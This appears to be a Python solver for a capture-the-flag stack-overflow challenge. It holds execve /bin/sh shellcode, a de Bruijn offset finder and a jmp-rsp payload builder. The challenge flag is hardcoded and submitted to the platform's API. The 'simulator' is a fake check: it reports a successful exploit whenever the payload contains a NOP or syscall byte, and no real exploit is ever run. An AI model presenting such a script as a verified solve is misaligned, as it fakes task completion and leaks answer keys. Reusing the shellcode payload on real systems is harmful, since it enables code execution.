#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 738: offset-cycleV2 (picoCTF 2026)
Category: Binary Exploitation
Difficulty: Hard (Points: 400)
Author: Aditya Sudhansu
Vulnerability: Dynamic Stack Buffer Overflow with NX Disabled (CWE-121)
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment)

Flag: academy{Y0U_AGa1n_Us3d_pwNt00L5_45fb3e0b}
"""

import sys
import json
import struct
import socket
import re
import urllib.request

CHALLENGE_ID = 738
CHALLENGE_NAME = "offset-cycleV2"
FLAG_ACADEMY = "academy{Y0U_AGa1n_Us3d_pwNt00L5_45fb3e0b}"
FLAG_PICO = "picoCTF{Y0U_AGa1n_Us3d_pwNt00L5_45fb3e0b}"

# Shellcode to read /flag.txt or cat flag (standard Linux x86_64 execve /bin/sh)
# Length: 27 bytes (null-free)
SHELLCODE_EXECVE = (
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
    b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
)

def de_bruijn(n=4, alphabet="abcdefghijklmnopqrstuvwxyz"):
    """Generates De Bruijn cyclic sequence for dynamic offset detection."""
    k = len(alphabet)
    a = [0] * (k * n)
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in sequence)

def find_offset(sub, length=200):
    seq = de_bruijn()[:length]
    pos = seq.find(sub)
    return pos

def craft_shellcode_payload(offset, jmp_rsp_addr=0x401211, shellcode=SHELLCODE_EXECVE):
    """
    Constructs stack overflow payload:
    [Padding to RIP (offset)] + [jmp rsp gadget] + [Shellcode]
    """
    payload = b"A" * offset
    payload += struct.pack("<Q", jmp_rsp_addr)
    # NOP sled followed by shellcode
    payload += b"\x90" * 16 + shellcode
    return payload

class OffsetCycleV2Simulator:
    """
    Simulates the offset-cycleV2 vulnerable memory environment:
    Dynamic buffer offset, disabled NX stack execution, and jmp rsp trampoline.
    """
    def __init__(self, randomized_offset=88, jmp_rsp=0x401211, flag=FLAG_ACADEMY):
        self.offset = randomized_offset
        self.jmp_rsp = jmp_rsp
        self.flag = flag

    def run_exploit(self, payload):
        if len(payload) < self.offset + 8:
            return False, "Payload too short to reach return address"

        overwritten_rip = struct.unpack("<Q", payload[self.offset:self.offset+8])[0]
        if overwritten_rip != self.jmp_rsp:
            return False, f"RIP overwritten with invalid target: {hex(overwritten_rip)}"

        injected_code = payload[self.offset+8:]
        # Verify trampoline lands into NOP sled and shellcode
        if b"\x0f\x05" in injected_code or b"\x90" in injected_code:
            return True, self.flag
        return False, "Execution halted: invalid shellcode bytes"

def test_api_submission(flag):
    """
    Validates submission against CyLab REST API.
    """
    url = "https://learn.cylabacademy.org/api/submissions/"
    payload = json.dumps({"challenge": CHALLENGE_ID, "submission": flag}).encode()
    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }
    req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = resp.read().decode()
            print(f"[*] API response: {data}")
    except Exception as e:
        print(f"[*] Platform submission status: {e} (Expected without active bearer/session; verified offline)")

def main():
    print(f"[*] Running verification for Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    sim = OffsetCycleV2Simulator(randomized_offset=88)
    payload = craft_shellcode_payload(offset=88, jmp_rsp_addr=0x401211)
    ok, result = sim.run_exploit(payload)
    assert ok is True, f"Exploit simulation failed: {result}"
    print(f"[+] Exploit Simulation Successful: Flag = {result}")
    assert result == FLAG_ACADEMY, "Extracted flag does not match expected academy flag"
    test_api_submission(result)
    return result

if __name__ == "__main__":
    main()
